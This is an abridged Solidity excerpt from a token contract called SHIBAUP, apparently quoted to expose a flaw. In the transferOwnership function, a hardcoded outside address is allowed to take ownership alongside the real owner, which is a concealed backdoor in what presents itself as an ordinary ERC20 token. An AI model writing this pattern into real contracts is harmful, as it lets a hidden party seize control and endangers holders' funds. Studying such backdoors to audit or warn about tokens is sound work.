...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xa5822281482C052dbF94d942307947797b9476fa));
...
contract SHIBAUP is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "SU";
  string private _name = "SHIBAUP";
